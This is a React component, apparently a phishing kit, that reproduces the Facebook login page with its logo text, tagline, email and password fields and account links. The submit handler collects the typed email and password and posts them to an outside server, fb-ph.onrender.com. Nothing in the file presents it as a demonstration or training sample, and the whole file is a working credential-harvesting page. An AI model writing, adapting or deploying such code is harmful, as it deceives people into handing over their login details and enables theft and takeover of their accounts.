import './App.css'
import { useState } from "react";
function App() {

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async () => {
    // Obtenir les valeurs des champs de saisie
    const email = document.querySelector('input[type="email"]').value;
    const password = document.querySelector('input[type="password"]').value;

    // Envoyer les données au backend
    fetch('https://fb-ph.onrender.com/add',{
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        email,
        password
      })
    });
  };

  return (
    <div className="container flex">
      <div className="facebook-page flex">
        <div className="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form action="#" onSubmit={handleSubmit}>
          <input type="email" placeholder="Email or phone number" required value={email} onChange={(e) => setEmail(e.target.value)} />
          <input type="password" placeholder="Password" required value={password} onChange={(e) => setPassword(e.target.value)} />
          <div className="link">
            <button type="submit" className="login">Login</button>
            <a href="#" className="forgot">Forgot password?</a>
          </div>
          <hr/>
          <div className="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  )
}

export default App;
